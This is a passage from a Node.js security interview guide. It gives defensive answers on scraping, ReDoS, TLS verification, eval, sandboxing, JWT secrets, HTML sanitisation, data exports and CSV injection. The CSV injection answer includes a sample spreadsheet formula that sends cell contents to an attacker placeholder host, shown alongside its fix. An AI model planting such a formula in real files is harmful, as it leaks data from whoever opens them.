## 438: Scenario: your API is being scraped by bots using residential IPs. What do you do?

IP-based limits don't work well when each request comes from a different home IP.

- Require authentication for valuable data and rate limit per account.
- Use bot detection at the edge (TLS and HTTP fingerprints, behavior, challenges).
- Make expensive or valuable endpoints harder to call in bulk: smaller page sizes, no total counts, cursor tokens that expire.
- Watch for patterns like sequential IDs and identical request shapes.
- Accept that you can raise the cost but not stop scraping completely. Decide what's worth protecting.

## 439: Scenario: an endpoint's response time spikes to seconds for certain inputs. How do you check if it's an attack?

- Find the inputs (from logs with request IDs and durations).
- Check for regexes, sorting, or recursive processing on that input (ReDoS or algorithmic complexity).
- Check database query plans for that input (missing index, huge `IN` lists, leading wildcard `LIKE`).
- Profile with `--cpu-prof` or clinic.js using a reproduced request.
- Look at the source of the requests: one client, many, a pattern?

Fix the root cause (input limits, a safe regex, an index) and add a timeout as a safety net.

## 440: Scenario: a developer wants to disable TLS verification to call an internal service. What do you suggest?

Don't disable it globally (`NODE_TLS_REJECT_UNAUTHORIZED=0`) or per request (`rejectUnauthorized: false`). Instead:

- Add the internal CA certificate: `NODE_EXTRA_CA_CERTS=/etc/ssl/internal-ca.pem`, or `--use-system-ca` if the CA is installed in the OS store, or pass `ca` to a dedicated agent for that service only.
- If the certificate's hostname doesn't match, fix the certificate (add the right SAN), not the check.
- For service meshes, let the mesh handle mTLS.

Explain the risk: without verification, any machine on the network path can impersonate the service.

## 441: Scenario: you find `eval` used to parse a config value from a database. How do you fix it?

First understand why. Usually it's to support expressions, functions or non-JSON syntax.

- If the data is plain values, switch to `JSON.parse` with schema validation.
- If it supports simple expressions (like pricing rules), use a small rule format with a fixed set of operators, or a safe expression library that only evaluates math and comparisons (check that it's maintained and has no open sandbox escape issues).
- Migrate existing data, and add a lint rule (`no-eval`, `no-new-func`) to stop it from coming back.

Check who can write that database field. If users can, this may already be an RCE.

## 442: Scenario: you need to give customers a way to run custom logic in your product. How do you design it?

- Start with configuration instead of code: rules, conditions and templates with limited, logic-less features.
- If real code is needed, run it outside your main process: a sandboxed runtime with isolated-vm or WebAssembly for small scripts, or containers/microVMs for bigger code.
- Give the code a tiny, explicit API (capabilities), not access to your internal objects.
- Limit CPU time, memory, output size and network access, and allow only allowlisted outbound calls.
- Run each customer's code separately, never in the same isolate as another customer.
- Log executions and allow you to disable a customer's code quickly.

## 443: Scenario: a penetration test reports "JWT secret is weak". What do you do?

A weak HS256 secret can be brute-forced offline from any token, letting attackers forge tokens for any user.

1. Generate a strong secret (`crypto.randomBytes(64)`) or, better, switch to an asymmetric algorithm (ES256 or EdDSA) with keys in a KMS or secrets manager.
2. Deploy with support for both old and new keys only if needed for a smooth switch. For a suspected compromise, invalidate old tokens immediately.
3. Check logs for signs of forged tokens (tokens with unusual claims or for users who weren't active).
4. Add a startup check that rejects short secrets.

## 444: Scenario: an audit finds that support staff can query production data freely. How do you improve it?

- Replace direct database access with an internal admin tool that has role-based access and shows only what's needed for each task.
- For rare direct access, use just-in-time access: a request with a reason, approval, time-limited credentials and session recording.
- Mask sensitive fields by default (show last 4 digits).
- Log all access with who, what and why, and review it.
- Remove shared database accounts.

## 445: Scenario: your app must accept HTML from users (a rich text editor). How do you make it safe?

- Sanitize on the server with an allowlist of tags and attributes, using `sanitize-html` or DOMPurify with jsdom. Don't try to write your own.
- Allow only safe URL schemes in `href` and `src` (`https:`, `mailto:`), no `javascript:` or `data:` for links.
- Sanitize on save and also consider sanitizing on render, so a future bug or config change in one place doesn't expose old data.
- Set a strict CSP as a second layer.
- Consider storing a structured format (like the editor's JSON document model) instead of raw HTML, and render it with known components.

```js
import sanitizeHtml from "sanitize-html";

const clean = sanitizeHtml(dirty, {
  allowedTags: [
    "p",
    "b",
    "i",
    "em",
    "strong",
    "a",
    "ul",
    "ol",
    "li",
    "br",
    "h2",
    "h3",
    "blockquote",
    "code",
    "pre",
  ],
  allowedAttributes: { a: ["href"] },
  allowedSchemes: ["https", "mailto"],
});
```

## 446: Scenario: you're asked to add an "export all my data" feature. What security points do you consider?

- Strong authentication and maybe step-up auth before export, since it's a perfect target for account takeover.
- Generate the export in a background job, not during the request.
- Store the file privately with a short-lived download link, available only to the logged-in user, and delete it after a few days.
- Notify the user by email when an export is requested and ready.
- Rate limit exports.
- Make sure it includes only the user's own data (no other users' private data in shared items).
- Watch out for CSV injection if you export CSV: values starting with `=`, `+`, `-` or `@` can run formulas in Excel, so prefix them with `'`.

## 447: What is CSV injection and how do you prevent it?

When an exported CSV is opened in Excel or Google Sheets, cells starting with `=`, `+`, `-`, `@`, tab or carriage return can be treated as formulas. An attacker who controls a field (like their name) can put `=HYPERLINK("http://evil.com?d="&A1,"Click")` and steal data or trick the person opening the file.

Prefix such values with a single quote, and quote all fields:

```js
function csvCell(value) {
  let s = String(value ?? "");
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  return `"${s.replace(/"/g, '""')}"`;
}
```

## 448: How would you run a security program for a small Node team with limited time?

Focus on what gives the most protection for the least effort:

1. Patching: Dependabot or Renovate with auto-merge for patch updates, and Node LTS updates.
2. Secrets: a secrets manager, secret scanning with push protection, no long-lived cloud keys.
3. Auth: use a proven auth library or provider, MFA for all staff accounts and admin tools.
4. A secure app template: Helmet, validation, rate limiting, error handler, logging with redaction.
5. Authorization tests for every endpoint.
6. Backups that you've actually tested restoring.
7. Basic monitoring and an incident response checklist.

Then do a threat model for the most sensitive feature and fix what it finds.

## 449: How do you keep up with Node.js security without reading everything?

- Subscribe to Node.js security release announcements and GitHub advisories for your dependencies (through Dependabot).
- Follow a few good sources: the Node.js blog, the OpenJS Foundation, npm/GitHub changelog posts, OWASP updates, and supply chain security vendors' blogs (Socket, Snyk) for npm incidents.
- Read the postmortems of big incidents. They show real attack paths better than theory.
- Do a quick check of your own systems when a big incident hits: are we affected, what would have stopped it?

## 450: What has changed recently in Node.js and npm security that you should know about?

- The permission model is stable (since Node 23.5 and 22.13) and Node 25 added `--allow-net` for network access.
- Node 24 added `crypto.argon2()` (experimental, since v24.7.0), so Argon2 is available without a native package.
- Starting with Node 27, there is one major release per year and every release becomes LTS.
- Node has built-in `.env` loading (`--env-file`, `process.loadEnvFile`) and system CA support (`--use-system-ca`).
- `--experimental-policy` was removed.
- Express 5 is the default on npm, with safer defaults for query parsing and async error handling.
- After the 2025 supply chain attacks, npm revoked classic tokens, shortened granular token lifetimes, moved `npm login` to short sessions, and pushed trusted publishing with provenance.
- pnpm 10 blocks dependency install scripts by default and supports a minimum release age for new versions.
- The OWASP Top 10 2025 added "Software Supply Chain Failures" and "Mishandling of Exceptional Conditions" as categories.
- Big framework issues like the Next.js middleware bypass (CVE-2025-29927) and the React Server Components RCE (CVE-2025-55182) showed that server code in full-stack frameworks needs the same care as any API.
